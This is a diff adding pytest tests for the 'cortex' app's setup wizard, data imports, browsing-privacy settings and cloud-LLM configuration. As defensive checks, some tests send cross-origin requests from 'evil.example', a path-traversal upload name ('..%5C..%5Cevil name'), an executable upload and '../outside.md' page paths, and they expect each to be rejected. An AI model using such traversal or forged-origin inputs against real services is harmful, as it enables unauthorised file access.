+    assert wizard.runner_state("ollama") == "stopped"
+    _, s, _, _ = call(app, "GET", "/api/setup")
+    assert s["runner"]["ollama"]["state"] == "stopped" and not s["runner"]["done"]
+    assert s["runner"]["recommend"] == "ollama"
+    monkeypatch.setattr(localllm, "find", lambda config=None: None)
+    call(app, "POST", "/api/setup/test", {"model": "2b", "runner": "ollama"})
+    assert wizard.STOPPED.format("Ollama") in wait_job(app)["error"]
+    monkeypatch.setattr(status, "ollama_models", lambda: [])
+    assert wizard.runner_state("ollama") == "running"
+    assert call(app, "GET", "/api/setup")[1]["runner"]["done"]
+    call(app, "POST", "/api/setup/test", {"model": "2b", "runner": "ollama"})
+    assert "no local runner answered" in wait_job(app)["error"]  # running: the real error
+
+
+def test_start_ollama_detached_then_waits_until_it_answers(monkeypatch, home):
+    import sys
+
+    started, serving = [], []
+    monkeypatch.setattr(targets, "_which", lambda c: "C:\\o\\ollama.exe" if c == "ollama"
+                        else None)
+    monkeypatch.setattr(status, "ollama_models", lambda: [] if serving else None)
+    monkeypatch.setattr(actions, "_popen", lambda args, **k: (
+        started.append((args, k)), serving.append(1)))
+    out = wizard.start("ollama")
+    assert out["ok"] and out["state"] == "running"
+    args, k = started[0]
+    assert args == ["C:\\o\\ollama.exe", "serve"] and "env" not in k  # no OLLAMA_HOST of ours
+    assert k["stdin"] == k["stdout"] == k["stderr"] == wizard.subprocess.DEVNULL
+    assert k.get("creationflags") or k.get("start_new_session")
+    assert wizard.start("ollama")["lines"] == ["Ollama is already running"]
+    if sys.platform == "win32":  # the desktop app wins when installed
+        app_exe = home / "LOCALAPPDATA" / "Programs" / "Ollama" / "ollama app.exe"
+        app_exe.parent.mkdir(parents=True)
+        app_exe.write_bytes(b"")
+        serving.clear()
+        wizard.start("ollama")
+        assert started[-1][0] == [str(app_exe)]
+    monkeypatch.setattr(targets, "_which", lambda c: None)
+    serving.clear()
+    with pytest.raises(ValueError, match="not installed"):
+        wizard.start("ollama")
+
+
+def test_start_lmstudio_runs_lms_server_start(monkeypatch, fakes):
+    from cortex import localllm
+
+    ports = [None]
+    monkeypatch.setattr(status, "lms_path", lambda: "C:\\lms\\lms.exe")
+    monkeypatch.setattr(localllm, "lmstudio_state", lambda config=None: {
+        "port": ports[-1], "loaded": []})
+    monkeypatch.setattr(targets, "_run", lambda args, timeout=300: (
+        fakes.append(list(args)), ports.append(1234), (True, "started"))[-1])
+    assert wizard.runner_state("lmstudio") == "stopped"
+    out = wizard.start("lmstudio")
+    assert out["ok"] and fakes[-1] == ["C:\\lms\\lms.exe", "server", "start"]
+    monkeypatch.setattr(targets, "_run", lambda args, timeout=300: (False, "boom"))
+    ports.append(None)
+    with pytest.raises(ValueError, match="lms server start"):
+        wizard.start("lmstudio")
+    with pytest.raises(ValueError, match="runner must be"):
+        wizard.start("llamacpp")
+
+
+@pytest.mark.parametrize("plat,systemd,rel,on_cmds", [
+    ("darwin", False, "Library/LaunchAgents/cortex-browse-receiver.plist",
+     [["launchctl", "load", "-w"]]),
+    ("linux", True, ".config/systemd/user/cortex-browse-receiver.service",
+     [["systemctl", "--user", "daemon-reload"],
+      ["systemctl", "--user", "enable", "cortex-browse-receiver.service"]]),
+    ("linux", False, ".config/autostart/cortex-browse-receiver.desktop", []),
+])
+def test_start_at_login_outside_windows(monkeypatch, home, fakes, plat, systemd, rel, on_cmds):
+    """G6: a LaunchAgent, a systemd user unit, or an XDG autostart entry; shown first, written
+    only by the click, and removed again."""
+    import plistlib
+    import sys
+    from pathlib import PurePosixPath
+
+    monkeypatch.setattr(sys, "platform", plat)
+    monkeypatch.setattr(status, "_systemd", lambda: systemd)
+    monkeypatch.delenv("XDG_CONFIG_HOME", raising=False)
+    monkeypatch.setattr(targets, "_run", lambda args, timeout=300: (
+        fakes.append(list(args)), (True, ""))[-1])
+    root, f = PurePosixPath("/home/sam/my vault 100%"), home / rel
+    assert status.login_task() == {"supported": True, "exists": False}
+    shown = status.login_shown(root)
+    assert str(f) in shown and status.login_text(root).strip() in shown and not f.exists()
+    actions.login(type("Job", (), {"say": lambda self, s: None})(), root, True)
+    text = f.read_text(encoding="utf-8")
+    assert status.login_task() == {"supported": True, "exists": True}
+    if plat == "darwin":
+        p = plistlib.loads(f.read_bytes())
+        assert p["Label"] == "cortex-browse-receiver" and p["RunAtLoad"] is True
+        assert p["ProgramArguments"][1:] == ["browse", "serve", "--vault", str(root)]
+        on_cmds = [on_cmds[0] + [str(f)]]
+    elif systemd:
+        assert '"browse" "serve" "--vault" "/home/sam/my vault 100%%"\n' in text
+        assert "ExecStart=" in text and "WantedBy=default.target" in text
+    else:
+        assert text.startswith("[Desktop Entry]\nType=Application\n")
+        assert 'Exec="' in text and '"--vault" "/home/sam/my vault 100%%"\n' in text
+    assert fakes == on_cmds
+    fakes.clear()
+    actions.login(type("Job", (), {"say": lambda self, s: None})(), root, False)
+    assert not f.exists() and status.login_task()["exists"] is False
+    assert [c[:3] for c in fakes] == ([["launchctl", "unload", "-w"]] if plat == "darwin" else
+                                      [["systemctl", "--user", "disable"]] if systemd else [])
+
+
+def test_setup_vault_creates_and_points(app, tmp_path, home):
+    target = tmp_path / "new vault"
+    call(app, "POST", "/api/setup/vault", {"path": str(target)})
+    job = wait_job(app)
+    assert job["error"] is None and (target / ".cortex").is_dir()
+    assert app.root == target.resolve()
+    from cortex import taint
+    assert Path(taint.config()["vault"]) == target.resolve()
+    call(app, "POST", "/api/setup/vault", {"path": "relative/path"})
+    assert "full path" in wait_job(app)["error"]
+
+
+def test_setup_state_and_no_download_without_a_click(app, monkeypatch):
+    _, s, _, _ = call(app, "GET", "/api/setup")
+    assert s["vault"]["done"] and not s["embed"]["done"] and s["embed"]["size"]
+    assert [m["id"] for m in s["model"]["options"]] == ["2b", "4b", "9b"]
+    assert all(m["size"] and m["tradeoff"] for m in s["model"]["options"])
+    assert s["model"]["recommend"] in ("2b", "4b", "9b")
+    started = []
+    monkeypatch.setattr(actions, "_popen", lambda args, **k: (started.append(args),
+                                                              FakeProc(b"done\n"))[1])
+    call(app, "POST", "/api/setup/embed", {})
+    wait_job(app)
+    assert started[0][1:3] == ["model", "download"]
+    assert started[1][1:3] == ["model", "build"]  # the index starts on its own
+
+
+# ---- private browse search: --private only for LM Studio's opt-in ---------------------------
+
+
+def _private_on(home, on=True):
+    (home / ".cortex").mkdir(exist_ok=True)
+    (home / ".cortex" / "config.yaml").write_text(
+        f"vault: x\nbrowse:\n  private_mcp: {'true' if on else 'false'}\n", encoding="utf-8")
+
+
+def _home_bytes(home) -> bytes:
+    return b"".join(p.read_bytes() for p in home.rglob("*") if p.is_file()
+                    and ".cortex" not in p.parts)
+
+
+def test_no_target_writes_private_but_lm_studio_opt_in(home):
+    for t in targets.targets():  # every app found on this (temp) computer
+        for p in t.paths():
+            p.parent.mkdir(parents=True, exist_ok=True)
+    for d in (".claude", ".gemini", ".codex", "APPDATA/Claude"):
+        (home / d).mkdir(parents=True, exist_ok=True)
+    ids = [t.id for t in targets.targets()]
+    assert all(targets.by_id()[i].detect() for i in ids)
+    done = targets.apply_all({i: True for i in ids}, ENTRY)
+    assert {r["id"] for r in done if r["change"] != "error"} == set(ids), done
+    assert b"--private" not in _home_bytes(home)
+
+    for on in (False, True):  # the opt-in: refused for all while off, LM Studio only when on
+        _private_on(home, on)
+        for i in ids:
+            rows = targets.plan_all({i: "private"}, ENTRY)
+            if on and i == "lmstudio":
+                assert [r["change"] for r in rows] == ["update"]
+            else:
+                assert [r["change"] for r in rows] == ["error"], (i, rows)
+                assert targets.apply_all({i: "private"}, ENTRY) == []
+        assert b"--private" not in _home_bytes(home)
+    targets.apply_all({"lmstudio": "private"}, ENTRY)
+    lms = home / ".lmstudio" / "mcp.json"
+    assert json.loads(lms.read_text())["mcpServers"]["cortex"]["args"][-1] == "--private"
+    assert targets.by_id()["lmstudio"].private()
+    rest = [p for p in home.rglob("*") if p.is_file() and p != lms and ".cortex" not in p.parts
+            and not p.name.endswith(".bak")]
+    assert not [p for p in rest if b"--private" in p.read_bytes()]
+    targets.apply_all({"lmstudio": True}, ENTRY)  # unticking the opt-in takes it out
+    assert "--private" not in lms.read_text() and not targets.by_id()["lmstudio"].private()
+
+
+def test_connect_offers_private_only_for_lm_studio_when_on(app, home):
+    (home / ".lmstudio").mkdir()
+    rows = {r["id"]: r for r in call(app, "GET", "/api/connect")[1]["targets"]}
+    assert not any(r["private_offer"] for r in rows.values())
+    code, plan, _, _ = call(app, "POST", "/api/connect/plan", {"want": {"lmstudio": "private"}})
+    assert code == 200 and plan["rows"][0]["change"] == "error"
+    assert call(app, "POST", "/api/connect/plan", {"want": {"cursor": "private"}})[0] == 400
+    _private_on(home)
+    rows = {r["id"]: r for r in call(app, "GET", "/api/connect")[1]["targets"]}
+    assert [i for i, r in rows.items() if r["private_offer"]] == ["lmstudio"]
+    assert call(app, "POST", "/api/connect/apply", {"want": {"lmstudio": "private"}})[0] == 200
+    assert wait_job(app)["error"] is None
+    rows = {r["id"]: r for r in call(app, "GET", "/api/connect")[1]["targets"]}
+    assert rows["lmstudio"]["private"] and rows["lmstudio"]["connected"]
+
+
+def test_browsing_privacy_defaults_and_categories(app, home):
+    from cortex import taint
+    from cortex.browse import lists
+    s = call(app, "GET", "/api/browse")[1]["settings"]
+    assert s["visible_to_claude"] is False and s["private_mcp"] is False  # a new user
+    assert s["hidden_from_claude"] == s["categories"] == list(lists.CATEGORIES)
+    assert s["skip_categories"] == ["adult"]
+
+    (home / ".cortex").mkdir(exist_ok=True)
+    (home / ".cortex" / "config.yaml").write_text(
+        "vault: V\nrerank: false\nbrowse:\n  browsers: [chrome]\n", encoding="utf-8")
+    body = {"visible_to_claude": True, "private_mcp": True, "deny": [], "allow": [],
+            "private": [], "hidden_from_claude": ["health", "adult"],
+            "skip_categories": ["adult", "betting"]}
+    assert call(app, "POST", "/api/browse/settings", body)[0] == 200
+    c = taint.config()
+    assert c["vault"] == "V" and c["rerank"] is False and c["browse"]["browsers"] == ["chrome"]
+    b = c["browse"]
+    assert b["hidden_from_claude"] == ["adult", "health"] and b["private_mcp"] is True
+    assert b["skip_categories"] == ["adult", "betting"]
+    assert (b["adult"], b["sensitive"]) == ("skip", "private")  # legacy pair kept in step
+    s = call(app, "GET", "/api/browse")[1]["settings"]
+    assert s["visible_to_claude"] and s["private_mcp"] and s["skip_categories"] == [
+        "adult", "betting"] and s["hidden_from_claude"] == ["adult", "health"]
+
+    for bad in ({"skip_categories": ["cats"]}, {"hidden_from_claude": "health"},
+                {"private_mcp": "yes"}):
+        assert call(app, "POST", "/api/browse/settings", {**body, **bad})[0] == 400
+    assert call(app, "POST", "/api/browse/settings", {**body, "private_mcp": False})[0] == 200
+    assert taint.config()["browse"]["private_mcp"] is False
+
+
+# ---- onboarding: runner start, one-click model, extension, guided imports -----------------
+
+EXPORTS = Path(__file__).parent / "fixtures" / "exports"
+NEW_POSTS = ("/api/import/upload", "/api/import/preview", "/api/import/run", "/api/setup/start",
+             "/api/setup/model", "/api/browse/setup")
+
+
+def upload(app, data: bytes, name: str, *, length: int | None = None,
+           ctype="application/octet-stream", token=True) -> tuple[int, dict | None]:
+    """A raw upload; `length` may claim more than is sent (the body is then not sent)."""
+    with socket.create_connection(("127.0.0.1", app.port), timeout=30) as s:
+        head = ["POST /api/import/upload HTTP/1.1", f"Host: 127.0.0.1:{app.port}",
+                f"Content-Type: {ctype}", f"X-Cortex-Name: {name}",
+                f"Content-Length: {len(data) if length is None else length}",
+                "Connection: close"] + ([f"X-Cortex-Token: {app.token}"] if token else [])
+        s.sendall(("\r\n".join(head) + "\r\n\r\n").encode() + (data if length is None else b""))
+        raw = b""
+        while chunk := s.recv(65536):
+            raw += chunk
+    head, _, body = raw.partition(b"\r\n\r\n")
+    return int(head.split()[1]), json.loads(body) if body else None
+
+
+def test_new_routes_need_the_key_and_the_origin(app):
+    for path in NEW_POSTS:
+        assert call(app, "POST", path, {}, token=False)[0] == 401, path
+        assert call(app, "POST", path, {}, origin="http://evil.example")[0] == 403, path
+        assert call(app, "GET", path)[0] == 405, path
+    assert upload(app, b"[]", "a.json", token=False)[0] == 401
+
+
+def test_upload_is_capped_named_by_the_app_and_typed(app, home):
+    code, body = upload(app, b"", "big.zip", length=4 * 2**30 + 1)
+    assert code == 413 and "4 GB" in body["error"]
+    assert upload(app, b"MZ", "tool.exe")[0] == 400
+    assert upload(app, b"[]", "a.json", ctype="application/json")[0] == 415
+    data = (EXPORTS / "chatgpt_conversations.json").read_bytes()
+    code, body = upload(app, data, "..%5C..%5Cevil%20name.JSON")  # the client's path is ignored
+    assert code == 200 and body["size"] == len(data)
+    files = list((home / ".cortex" / "tmp").iterdir())
+    assert [p.name for p in files] == [f"upload-{body['upload']}-evilname.json"]
+    assert files[0].read_bytes() == data and app.uploads[body["upload"]] == files[0]
+
+
+def test_guided_chat_import_previews_then_imports(app, home):
+    from cortex import chats
+    data = (EXPORTS / "chatgpt_conversations.json").read_bytes()
+    _, up = upload(app, data, "conversations.json")
+    out = chats.export_root() / "chatgpt"
+    assert call(app, "POST", "/api/import/preview", {"source": "chatgpt",
+                                                     "upload": up["upload"]})[0] == 200
+    job = wait_job(app)
+    r = job["result"]
+    assert job["error"] is None and r["kind"] == "import-preview" and r["already"] == 0
+    assert r["found"] >= 1 and r["lines"][0].startswith("Found ")
+    assert not out.exists()  # a dry run: nothing imported
+    assert list((home / ".cortex" / "tmp").iterdir()) == [app.uploads[up["upload"]]]
+    call(app, "POST", "/api/import/run", {"source": "chatgpt", "upload": up["upload"]})
+    job = wait_job(app)
+    assert job["error"] is None and job["result"]["counts"]["conversations"] == r["found"]
+    assert len(list(out.glob("*.jsonl"))) == r["found"] and str(out) in job["result"]["lines"][0]
+    assert up["upload"] not in app.uploads and not list((home / ".cortex" / "tmp").iterdir())
+    # the path field, and the card's status
+    call(app, "POST", "/api/import/preview", {"source": "chatgpt",
+                                              "path": str(EXPORTS / "chatgpt_conversations.json")})
+    assert wait_job(app)["result"]["already"] == r["found"]
+    _, s, _, _ = call(app, "GET", "/api/setup")
+    assert s["imports"]["chatgpt"]["count"] == r["found"] and s["imports"]["claude"]["count"] == 0
+    assert set(s["guides"]) >= {"claude", "chatgpt", "gemini", "perplexity", "google-activity"}
+    # a failing preview deletes the upload
+    _, bad = upload(app, b"not json", "x.json")
+    call(app, "POST", "/api/import/preview", {"source": "claude", "upload": bad["upload"]})
+    assert wait_job(app)["error"] and bad["upload"] not in app.uploads
+    for body in ({"source": "myspace", "path": str(EXPORTS)}, {"source": "chatgpt"},
+                 {"source": "chatgpt", "path": "relative/x.zip"},
+                 {"source": "chatgpt", "path": str(home / "missing.zip")},
+                 {"source": "chatgpt", "upload": "nope"}):
+        assert call(app, "POST", "/api/import/preview", body)[0] == 400, body
+
+
+def test_google_activity_goes_through_the_browse_import(app, home, monkeypatch):
+    from cortex import semantic
+    from cortex.browse import build, sources
+    monkeypatch.setattr(sources, "discover", lambda *a, **k: [])
+    path = str(EXPORTS / "takeout_MyActivity.json")
+    seen: list[bytes] = []
+    call(app, "POST", "/api/import/preview", {"source": "google-activity", "path": path})
+    job = wait_job(app, seen)
+    assert job["result"]["found"] >= 1 and "privacy filter" in job["result"]["note"]
+    assert job["result"]["need"] == "embed"  # said at Check already (R3-3)
+    _, up = upload(app, Path(path).read_bytes(), "MyActivity.json")
+    call(app, "POST", "/api/import/run", {"source": "google-activity", "upload": up["upload"]})
+    assert wait_job(app, seen)["result"]["need"] == "embed"  # no search model yet
+    assert up["upload"] in app.uploads  # kept, to retry once the model is in
+    runs = []
+
+    def fake_run(v, srcs, settings, *, takeout=None, **kw):
+        runs.append(takeout)
+        return {"sources": 0, "takeout": len(takeout), "private_written": 2,
+                "days_from": "2026-09-28"}
+    monkeypatch.setattr(build, "run", fake_run)
+    monkeypatch.setattr(semantic, "load_embedder", lambda *a, **k: lambda texts: None)
+    call(app, "POST", "/api/import/run", {"source": "google-activity", "path": path})
+    job = wait_job(app, seen)
+    assert job["error"] is None and len(runs[0]) >= 1
+    assert job["result"]["counts"]["google_rows_used"] == len(runs[0])
+    assert "browse" in job["result"]["lines"][0]
+    assert b"Dijkstra" not in b"".join(seen)  # counts and dates only
+
+
+def test_setup_start_and_one_click_model(app, monkeypatch):
+    from cortex import localllm, taint
+    started = []
+    monkeypatch.setattr(wizard, "start", lambda r: (started.append(r),
+                                                     {"ok": True, "lines": ["running"]})[1],
+                        raising=False)
+    call(app, "POST", "/api/setup/start", {"runner": "ollama"})
+    assert wait_job(app)["result"]["ok"] and started == ["ollama"]
+    assert call(app, "POST", "/api/setup/start", {"runner": "vllm"})[0] == 400
+
+    class Fake:
+        def describe(self):
+            return "ollama qwen3.5:2b"
+
+        def classify(self, text, labels):
+            return "programming", 0.9
+    monkeypatch.setattr(targets, "_which", lambda c: "C:\\o\\ollama.exe" if c == "ollama"
+                        else None)
+    monkeypatch.setattr(status, "ollama_models", lambda: [])
+    pulled = []
+    monkeypatch.setattr(actions, "_popen", lambda args, **k: (pulled.append(args),
+                                                              FakeProc(b"success\n"))[1])
+    monkeypatch.setattr(localllm, "find", lambda config=None: Fake())
+    call(app, "POST", "/api/setup/model", {"model": "2b", "runner": "ollama"})
+    job = wait_job(app)
+    assert job["error"] is None and pulled == [["C:\\o\\ollama.exe", "pull", "qwen3.5:2b"]]
+    assert job["result"]["answer"] == "programming"  # pull, then Test
+    assert taint.config()["localllm"]["model"] == "qwen3.5:2b"
+
+
+def test_extension_setup_pairs_then_starts_the_receiver(app, vault, monkeypatch, fakes):
+    from cortex import browse_serve
+    monkeypatch.setattr(browse_serve, "PORT", 0)
+    code, body, _, _ = call(app, "POST", "/api/browse/setup", {})
+    assert code == 200 and len(body["token"]) > 20
+    assert (vault / ".cortex" / "browse" / "token").read_text().strip() == body["token"]
+    assert app.receiver.srv is not None
+    if body["opened"]:
+        assert fakes[-1][0] == "open" and fakes[-1][1].endswith("/extension")
+
+
+# ---- ask your archive, the audience control, cloud settings, setup order ------------------
+
+
+class AskRunner:
+    """A local runner that answers from passage 1."""
+
+    def __init__(self):
+        from cortex import localllm
+        self.r = localllm.Runner("ollama", "http://127.0.0.1:11434", "gemma3:2b")
+
+    def describe(self):
+        return self.r.describe()
+
+    def chat(self, system, user, **kw):
+        return "Move the pointer on the smaller side [1]."
+
+
+@pytest.fixture
+def embed(monkeypatch):
+    from conftest import FakeEmbed
+
+    from cortex import semantic
+    monkeypatch.setattr(semantic, "_embedder", FakeEmbed())
+
+
+def test_ask_needs_the_key_and_the_origin(app):
+    assert call(app, "POST", "/api/ask", {"question": "x"}, token=False)[0] == 401
+    assert call(app, "POST", "/api/ask", {"question": "x"}, origin="http://evil.example")[0] == 403
+    assert call(app, "GET", "/api/ask", token=False)[0] == 401
+    for bad in ({}, {"question": "  "}, {"question": 3}, {"question": "x" * 2001}):
+        assert call(app, "POST", "/api/ask", bad)[0] == 400, bad
+
+
+def test_ask_without_a_local_model_says_so(app, embed):
+    assert call(app, "POST", "/api/ask", {"question": "two pointers"})[0] == 200
+    job = wait_job(app)
+    assert job["section"] == "ask" and job["error"] is None
+    assert job["result"]["error"] == "missing" and job["result"]["missing"] == ["llm"]
+
+
+def test_ask_answers_with_sources_and_the_model(app, embed, monkeypatch, vault, fakes):
+    from cortex import cloudllm, localllm
+    monkeypatch.setattr(localllm, "find", lambda config=None: AskRunner())
+    monkeypatch.setattr(cloudllm, "find", lambda *a, **k: pytest.fail("cloud runner used"))
+    call(app, "POST", "/api/ask", {"question": "two pointers"})
+    r = wait_job(app)["result"]
+    assert r["kind"] == "ask" and r["answer"].endswith("[1].") and "gemma3:2b" in r["model"]
+    assert r["sources"][0]["n"] == 1 and r["sources"][0]["path"].endswith(".md")
+    # a source opens in Obsidian; only a page inside the vault
+    assert call(app, "POST", "/api/open", {"what": "page",
+                                           "path": r["sources"][0]["path"]})[0] == 200
+    assert fakes[-1][1].startswith("obsidian://open?path=")
+    for bad in ("../outside.md", str(vault / "concepts" / "two-pointers.md"), "concepts/none.md",
+                ".cortex/config.md", 5):
+        assert call(app, "POST", "/api/open", {"what": "page", "path": bad})[0] == 400, bad
+
+
+def _browse_body(**extra):
+    return {"visible_to_claude": True, "private_mcp": False, "deny": [], "allow": [],
+            "private": [], **extra}
+
+
+def test_audience_control_round_trip(app, home):
+    from cortex import taint
+    from cortex.browse import lists, load_settings, privacy
+    (home / ".cortex").mkdir(exist_ok=True)
+    (home / ".cortex" / "config.yaml").write_text(
+        "vault: V\nbrowse:\n  browsers: [chrome]\n  cloud_processing: true\n", encoding="utf-8")
+    want = {c: "local" for c in lists.CATEGORIES} | {"adult": "skip", "betting": "skip",
+                                                     "money": "cloud"}
+    assert call(app, "POST", "/api/browse/settings", _browse_body(audience=want))[0] == 200
+    c = taint.config()
+    b = c["browse"]
+    assert c["vault"] == "V" and b["browsers"] == ["chrome"] and b["cloud_processing"] is True
+    assert b["skip_categories"] == ["adult", "betting"]
+    assert b["hidden_from_claude"] == [x for x in lists.CATEGORIES
+                                       if x not in ("adult", "betting", "money")]
+    s = load_settings()
+    assert {x: privacy.audience(x, s) for x in lists.CATEGORIES} == want
+    got = call(app, "GET", "/api/browse")[1]["settings"]["audience"]
+    assert got == want
+    for bad in ({**want, "money": "everyone"}, {"adult": "skip"}, {**want, "cats": "skip"}, []):
+        assert call(app, "POST", "/api/browse/settings", _browse_body(audience=bad))[0] == 400
+
+
+def test_cloud_settings_off_by_default_https_and_no_key_field(app, home, vault, monkeypatch):
+    from cortex import cloudllm, taint
+    cloud = call(app, "GET", "/api/browse")[1]["cloud"]
+    assert cloud["cloud_processing"] is False and cloud["provider"] is None
+    assert cloud["key_set"] is False and cloud["runs"] == []
+    assert set(cloud["presets"]) == set(cloudllm.PRESETS)
+    (home / ".cortex").mkdir(exist_ok=True)
+    (home / ".cortex" / "config.yaml").write_text(
+        "vault: V\ncloudllm:\n  max_items: 50\nbrowse:\n  visible_to_claude: true\n",
+        encoding="utf-8")
+    body = {"cloud_processing": True, "provider": "custom", "model": "gpt-x",
+            "base_url": "https://llm.example/v1", "api_key_env": "MY_CLOUD_KEY"}
+    for bad in ({"base_url": "http://llm.example/v1"}, {"base_url": "https://u@llm.example"},
+                {"api_key_env": "sk-abcdef0123456789"}, {"api_key_env": "A B"},
+                {"api_key_env": "AIzaSyA1234567890abcdefghijklmnopqrstu"},
+                {"provider": "acme"}, {"model": "x y"}, {"cloud_processing": "yes"},
+                {"api_key": "sk-abcdef0123456789"}, {"key": "x"}, {"token": "x"},
+                {"secret": "x"}):
+        code, js, _, _ = call(app, "POST", "/api/browse/cloud", {**body, **bad})
+        assert code == 400, bad
+    assert "cloudllm" not in taint.config() or taint.config()["cloudllm"] == {"max_items": 50}
+    assert call(app, "POST", "/api/browse/cloud", body)[0] == 200
+    c = taint.config()
+    assert c["cloudllm"] == {"max_items": 50, "provider": "custom", "model": "gpt-x",
+                             "base_url": "https://llm.example/v1", "api_key_env": "MY_CLOUD_KEY"}
+    assert c["browse"] == {"visible_to_claude": True, "cloud_processing": True}
+    assert call(app, "POST", "/api/browse/cloud", {**body, "provider": "openai"})[0] == 200
+    assert "base_url" not in taint.config()["cloudllm"]  # a preset's base is its own
+
+    monkeypatch.setenv("MY_CLOUD_KEY", "sk-VALUEMARKER0123456789")
+    (vault / ".cortex" / "cloud-log.jsonl").write_text(
+        '{"ts": "2026-11-18T10:00:00Z", "provider": "openai", "model": "gpt-x", "items": 3, '
+        '"chars": 900, "skipped": 1}\nnot json\n', encoding="utf-8")
+    _, js, raw, _ = call(app, "GET", "/api/browse")
+    assert js["cloud"]["key_set"] is True and b"VALUEMARKER" not in raw
+    assert js["cloud"]["runs"] == [{"ts": "2026-11-18T10:00:00Z", "provider": "openai",
+                                    "model": "gpt-x", "items": 3, "chars": 900, "skipped": 1}]
+    assert call(app, "POST", "/api/browse/cloud", {**body, "cloud_processing": False})[0] == 200
+    assert taint.config()["browse"]["cloud_processing"] is False
+
+
+def test_setup_order_connects_apps_before_the_local_model(app):
+    _, s, _, _ = call(app, "GET", "/api/setup")
+    assert s["order"] == ["vault", "connect", "embed", "history", "llm"]
+    js = (server.ASSETS / "app.js").read_text(encoding="utf-8")
+    assert "d.order" in js  # the page follows the server's order
+
+
+def test_import_preview_writes_nothing(app, home):
+    from cortex import chats
+    call(app, "POST", "/api/import/preview", {
+        "source": "chatgpt", "path": str(EXPORTS / "chatgpt_conversations.json")})
+    r = wait_job(app)["result"]
+    assert r["found"] >= 1 and r["already"] == 0 and not list(chats.export_root().rglob("*"))
+    assert "CORTEX_CHAT_EXPORT_DIR" not in (Path(actions.__file__)).read_text(encoding="utf-8")
+
+
+# ---- board2 fixes: the import front door, Ask's missing pieces, cloud form, hardening -----
+
+
+def test_notes_and_calendar_cards_go_through_importers(app, home, vault):
+    """R3-1: the notes and calendar cards have guides, preview with the importer's dry run
+    (nothing written) and import as `cortex import` does."""
+    from cortex import importers
+    _, s, _, _ = call(app, "GET", "/api/setup")
+    for kind in ("notes", "calendar"):
+        assert s["guides"][kind]["steps"] == importers.GUIDES[kind]["steps"]
+    before = snapshot(vault / "resources")
+    call(app, "POST", "/api/import/preview", {"source": "notes", "path": str(EXPORTS / "notion")})
+    job = wait_job(app)
+    r = job["result"]
+    assert job["error"] is None and r["found"] == 2 and "Notion" in r["lines"][0]
+    call(app, "POST", "/api/import/preview", {"source": "calendar",
+                                              "path": str(EXPORTS / "calendar.ics")})
+    r = wait_job(app)["result"]
+    assert r["found"] == 3 and "3 events" in r["lines"][0]
+    assert snapshot(vault / "resources") == before  # dry runs
+    call(app, "POST", "/api/import/run", {"source": "notes", "path": str(EXPORTS / "obsidian")})
+    job = wait_job(app)
+    assert job["error"] is None and job["result"]["counts"] == {"notes": 4}
+    assert len(list((vault / "resources").glob("obsidian-*.md"))) == 4
+    call(app, "POST", "/api/import/run", {"source": "calendar",
+                                          "path": str(EXPORTS / "calendar.ics")})
+    assert wait_job(app)["result"]["counts"] == {"events": 3}
+    assert list((vault / "resources").glob("calendar-*.md"))
+    _, up = upload(app, (EXPORTS / "calendar.ics").read_bytes(), "my calendar.ics")
+    call(app, "POST", "/api/import/preview", {"source": "calendar", "upload": up["upload"]})
+    assert wait_job(app)["result"]["found"] == 0  # every event is already in
+
+
+@pytest.mark.parametrize("source,name,card", [
+    ("claude", "notion", "Notes card"), ("perplexity", "obsidian", "Notes card"),
+    ("chatgpt", "calendar.ics", "Calendar card"),
+    ("gemini", "takeout_MyActivity.json", "Google activity card"),
+    ("notes", "chatgpt_conversations.json", "ChatGPT"),
+])
+def test_a_card_refuses_another_kind_and_names_the_right_card(app, vault, source, name, card):
+    """R3-1: a Notion folder in the Claude guide is not imported as Perplexity chats."""
+    from cortex import chats
+    call(app, "POST", "/api/import/preview", {"source": source, "path": str(EXPORTS / name)})
+    job = wait_job(app)
+    assert job["result"] is None and card in job["error"], job
+    assert not chats.export_root().exists() or not list(chats.export_root().rglob("*.jsonl"))
+
+
+def test_uploaded_my_activity_is_still_google_activity(app, vault):
+    """An upload keeps a cleaned copy of its name, so `detect` tells MyActivity.json apart
+    from a chat export's single .json file, as `cortex import` does with the real name."""
+    data = (EXPORTS / "takeout_MyActivity.json").read_bytes()
+    _, up = upload(app, data, "MyActivity.json")
+    call(app, "POST", "/api/import/preview", {"source": "google-activity",
+                                              "upload": up["upload"]})
+    job = wait_job(app)
+    assert job["error"] is None and job["result"]["found"] >= 1
+
+
+def test_html_my_activity_uploads_for_google_activity_and_gemini(app, vault):
+    """G6: Takeout's HTML is read, so the page takes .html and no hint asks for JSON."""
+    from cortex.browse import takeout
+    html = EXPORTS / "takeout_html" / "Takeout" / "My Activity"
+    for card, sub in (("google-activity", "Search"), ("gemini", "Gemini Apps")):
+        status, up = upload(app, (html / sub / "MyActivity.html").read_bytes(),
+                            "MyActivity.html")
+        assert status == 200, up
+        call(app, "POST", "/api/import/preview", {"source": card, "upload": up["upload"]})
+        job = wait_job(app)
+        assert job["error"] is None, job
+    assert "English" in takeout.READ_HINT and "export again" not in takeout.READ_HINT
+    js = (Path(__file__).parents[1] / "src/cortex/assets/app/app.js").read_text("utf-8")
+    assert ".html" in js[js.index("id: 'imp-file'"):][:120]
+
+
+def test_chat_preview_and_import_copy(app, home):
+    """R3-9: no "(those are updated)" after 0, and no /cortex hint while no app is connected."""
+    path = str(EXPORTS / "chatgpt_conversations.json")
+    call(app, "POST", "/api/import/preview", {"source": "chatgpt", "path": path})
+    line = wait_job(app)["result"]["lines"][0]
+    assert "updated" not in line and "0 already" not in line
+    call(app, "POST", "/api/import/run", {"source": "chatgpt", "path": path})
+    line = wait_job(app)["result"]["lines"][0]
+    assert "Connect an AI app" in line and "In Claude, type" not in line
+    call(app, "POST", "/api/import/preview", {"source": "chatgpt", "path": path})
+    assert "already imported (those are updated)" in wait_job(app)["result"]["lines"][0]
+
+
+def test_google_activity_preview_says_the_search_model_is_needed(app, monkeypatch):
+    """R3-3: the need shows at Check, not after Import, and the result is not ok."""
+    from cortex.browse import sources
+    monkeypatch.setattr(sources, "discover", lambda *a, **k: [])
+    call(app, "POST", "/api/import/preview", {"source": "google-activity",
+                                              "path": str(EXPORTS / "takeout_MyActivity.json")})
+    r = wait_job(app)["result"]
+    assert r["need"] == "embed" and r["ok"] is False and r["found"] >= 1
+    js = (server.ASSETS / "app.js").read_text(encoding="utf-8")
+    assert "stopped: needs the search model" in js  # the job bar never says done for it
+
+
+def test_ask_lists_every_missing_piece_at_once(app, monkeypatch):
+    """R3-2: no search model and no local model: both named in one answer."""
+    from cortex import semantic
+    monkeypatch.setattr(semantic, "load_embedder", lambda *a, **k: None)
+    call(app, "POST", "/api/ask", {"question": "binary search"})
